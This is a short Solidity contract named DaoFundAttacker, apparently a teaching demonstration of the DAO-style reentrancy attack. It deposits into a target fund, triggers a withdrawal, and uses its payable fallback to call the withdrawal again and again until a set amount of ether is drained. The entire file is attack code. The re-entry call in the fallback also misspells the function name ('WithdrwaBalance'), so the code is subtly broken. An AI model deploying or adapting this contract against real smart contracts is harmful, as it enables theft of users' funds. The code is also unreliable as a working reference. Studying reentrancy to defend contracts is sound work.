pragma solidity ^0.4.23;

contract DaoFundAttacker {
    address fundAddress;
    int goalAmount;

    event WithdrawBalance(string message, uint gas);

    constructor (address  _fundAddress) public {
        fundAddress = _fundAddress;
    }

    function () public payable {
        goalAmount -= int(msg.value);

        if (goalAmount > 0) {
            if (fundAddress.call(bytes4(keccak256("WithdrwaBalance()")))) {
                emit WithdrawBalance("succeeded in fallback", gasleft());
            } else emit WithdrawBalance("Failed in fallback", gasleft());
        } else {
            emit WithdrawBalance("All GoalAmount is withdrawed", gasleft());
        }
    }

    function deposit() public payable {
        if (fundAddress.call.value(msg.value).gas(gasleft())
            (bytes4(keccak256("addToBalance()"))) == false) {
            revert();
            }
    }

    function withdraw(uint _goalAmount) public {
        goalAmount = int(_goalAmount * 1 ether);

        if (fundAddress.call(bytes4(keccak256("WithdrawBalance()")))==false ) {
            emit WithdrawBalance("Failed in withdraw", gasleft());
            revert();
        } else emit WithdrawBalance("Succeeded in withdraw", gasleft());
    }
}